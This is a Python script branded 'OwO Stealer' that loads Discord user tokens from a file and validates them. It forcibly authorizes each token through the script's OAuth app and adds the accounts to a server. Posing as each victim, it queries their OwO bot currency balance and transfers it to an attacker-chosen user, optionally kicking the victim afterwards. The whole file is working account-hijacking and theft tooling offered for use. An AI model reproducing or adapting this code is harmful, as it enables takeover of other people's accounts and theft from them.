import requests
import threading
import os
import sys
import json
from flask import Flask, request
import secrets
import discord
from discord.ext import commands
import time
import asyncio


os.system("clear||cls")
os.system("title OwO Stealer - [Auth#1337] | Tokens File: tokens.txt")

steal_owo = input("Do you want to steal owo cash y/n: ")

if steal_owo.lower() in ["y", "true", "yes", "yeah", "yep", "alla"]:
  stealowo = True
else:
  stealowo = False

kick_m = input("Do you want to kick members after checking/stealing owo y/n: ")

if kick_m.lower() in ["y", "true", "yes", "yeah", "yep", "alla"]:
  kickm = True
else:
  kickm = False

if stealowo:
  user_id = int(input("Enter User ID To Send OwO From Accounts: "))
else:
  user_id=None


with open("config.json", "r") as f:
  config = json.load(f)

client_id = config["client_id"]
client_secret = config["client_secret"]
client_token = config["bot_token"]
server_id = config["server_id"]
channel_id = config["channel_id"]
delay = config["delay"]
auth_url_ = config["authorize_url"]
redirect_uri = config["redirect_uri"]
__user = ""
__username = ""
__user_id = 0
__token = ""

client = commands.Bot(command_prefix=";", help_command=None, description="OwO Stealer", intents=discord.Intents.all())

app = Flask(__name__)

@app.route("/")
def index():
  if not request.args.get("code"):
    return "OwO Stealer By Auth#1337"
  code = request.args.get("code")
  client.dispatch("authorize", code)
  return "alla"

@app.route("/auth")
def indexx():
  print("a")
  if not request.args.get("code"):
    return "OwO Stealer By Auth#1337"
  code = request.args.get("code")
  client.dispatch("authorize", code)
  return "alla"



@client.event
async def on_ready():
  print(f"Connected To {client.user}")

def get_token(user_id):
  for tokenn in tokens_fr:
    if tokenn["user_id"] == user_id:
      return tokenn["token"]
      
@client.event
async def on_authorize(code):
  global __user
  global __user_id
  global __username
  global __token
  try:
    g_ = client.get_guild(server_id)
    data = {"client_id": client_id, "client_secret": client_secret, "grant_type": "authorization_code", "code": code, "redirect_uri": redirect_uri}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r_ = requests.post("https://discord.com/api/v10/oauth2/token", data=data, headers=headers)
    r_.raise_for_status()
    access_token = r_.json()["access_token"]
    r = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bearer {access_token}"})
    user_id = r.json()["id"]
    discriminator = r.json()["discriminator"]
    __user_id = user_id
    __user = r.json()["username"]
    __username = f"{__user}#{discriminator}" 
    url = f"https://discord.com/api/v10/guilds/{server_id}/members/{user_id}"
    data = {
            "access_token" : access_token,
        }
    headers = {
            "Authorization" : f"Bot {client_token}",
            'Content-Type': 'application/json'

        }
    response = requests.put(url=url, headers=headers, json=data)
    if response.status_code in [200,201,204]:
      print(f"{user_id} has been successfully added to the server")
      token = get_token(user_id)
      __token = token
      header = getheaders(token)
      r_ = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", json={"content": "owo cash"}, headers=header)
  except Exception as e:
    raise e
    print(e)

@client.event
async def on_message(message):
  global __token
  if message.author.id == 408785106942164992 and message.guild.id == server_id and message.channel.id == channel_id:
    if "cowoncy" in message.content and not "sent" in message.content:
      owo = f"{message.content}".replace("<:cowoncy:416043450337853441>", "").replace("**", "").replace(f"{__user},", "").replace(" ", "").replace("|", "").replace("you currently have", "").replace("__", "").replace("!", "").replace("youcurrentlyhave", "").replace("cowoncy", "")
      owo_ = ''.join([w for w in owo])
      print(f"OwO Cash: {owo_} | User: {__username} | User ID: {user_id}")
      __owo = f"{owo_}".replace(",", "")
      if not stealowo:
        if kickm:
          r = requests.delete(f"https://discord.com/api/v10/guilds/{server_id}/members/{__user_id}", headers={"Authorization": f"Bot {client_token}"})
      if stealowo:
        token = __token
        header = getheaders(token)
        print(f"Stealing {__owo} From {__username} | {__user_id}")
        r__ = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", json={"content": f"owo give {uformat} {__owo}"}, headers=header)
        if r__.status_code in [200,201,204]:
          print("Successfully Sent Request To Steal OwO Waiting For Bot Response")
        if kickm:
          time.sleep(2)
          r = requests.delete(f"https://discord.com/api/v10/guilds/{server_id}/members/{__user_id}", headers={"Authorization": f"Bot {client_token}"})
    elif "sent" in message.content:
      print(f"Successfully Stolen OwO From {__username} | {__user_id}")
    elif "error" in message.content:
      print("Failed To Stole Cowoncy!, You may not accepted owo bot rules.")
  await client.process_commands(message)

def getheaders(Toke):
  header = {
			'Authorization': Toke,
			'accept': '*/*',
			'accept-language': 'en-US',
			'connection': 'keep-alive',
			'cookie': f'__cfduid = {secrets.token_hex(43)}; __dcfduid={secrets.token_hex(32)}; locale=en-US',
			'DNT': '1',
			'origin': 'https://discord.com',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'referer': 'https://discord.com/channels/@me',
			'TE': 'Trailers',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36',
			'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
		}
  return header

auth_url = f"{auth_url_}".replace("https://discord.com/api/oauth2/authorize", "https://discord.com/api/v10/oauth2/authorize")

data_json = {"authorize": True, "permissions": 0}

uformat = f"<@{user_id}>"

with open("tokens.txt", "r") as f:
  tokens = f.read().splitlines()

tokens_fr = []

valid_tokens = []

def check_token():
  for token in tokens:
    r = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": token})
    if r.status_code in [204,200,201]:
      tokens_fr.append({"user_id": r.json()["id"], "token": token})
      valid_tokens.append(token)
      print("Valid Token",token)
    else:
      print("Invalid Token", token)

def run_app():
  app.run(host="0.0.0.0", port=8080)

threading.Thread(target=check_token).start()

time.sleep(3)
if valid_tokens == []:
  print("No valid tokens found")
  sys.exit()
else:
  print(f"{len(valid_tokens)} Valid tokens.")


def authorize_tokens():
  for token in valid_tokens:
    r = requests.post(auth_url, headers={"Authorization": token}, json=data_json)
    print(r.text)
    varv = r.json()["location"].replace(f"{redirect_uri}?code=", "")
    rfg = requests.get(redirect_uri+"?code="+varv)
    if r.status_code in [200,204,201]:
      print(f"Stealing OwO From {token}")
    time.sleep(delay)

@client.listen("on_ready")
async def _idk():
  time.sleep(3)
  authorize_tokens()

threading.Thread(target=run_app).start()
client.run(client_token)
